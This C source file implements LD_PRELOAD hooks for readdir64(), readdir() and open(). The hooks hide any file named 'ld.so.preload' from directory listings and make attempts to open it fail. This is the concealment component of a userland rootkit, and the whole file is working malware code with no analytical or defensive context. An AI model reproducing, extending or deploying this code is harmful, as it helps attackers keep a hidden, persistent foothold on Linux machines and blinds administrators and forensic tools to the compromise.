#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdlib.h>
#include <stdarg.h>
#include <dirent.h>
#include <sys/stat.h>
#include <linux/stat.h>
#include "preload.h"


// HOOKED: readdir64()
// ---------------------

// Intercepts directory reading to hide "ld.so.preload" from listings
struct dirent64 *readdir64(DIR *dirp) {
    struct dirent64 *(*r_readdir64)(DIR *dirp) = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *entry;

    while ((entry = r_readdir64(dirp)) != NULL) {
        if (strstr(entry->d_name, "ld.so.preload")) {
            continue;
        }
        return entry;
    }

    return NULL;
}


// HOOKED: readdir()
// ---------------------

// Legacy directory reader hook to hide "ld.so.preload"
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*r_readdir)(DIR *dirp) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;

    while ((entry = r_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, "ld.so.preload")) {
            continue;
        }
        return entry;
    }

    return NULL;
}


// HOOKED: open()
// ---------------------

// Blocks access to "ld.so.preload" file during open() calls
int open(const char *pathname, int flags, ...) {
    int (*r_open)(const char *pathname, int flags, ...) = dlsym(RTLD_NEXT, "open");

    va_list args;
    va_start(args, flags);
    int output = r_open(pathname, flags, va_arg(args, int));

    if (strstr(pathname, "ld.so.preload")) {
        close(output);
        errno = 2;
        return -1;
    }

    va_end(args);
    return output;
}
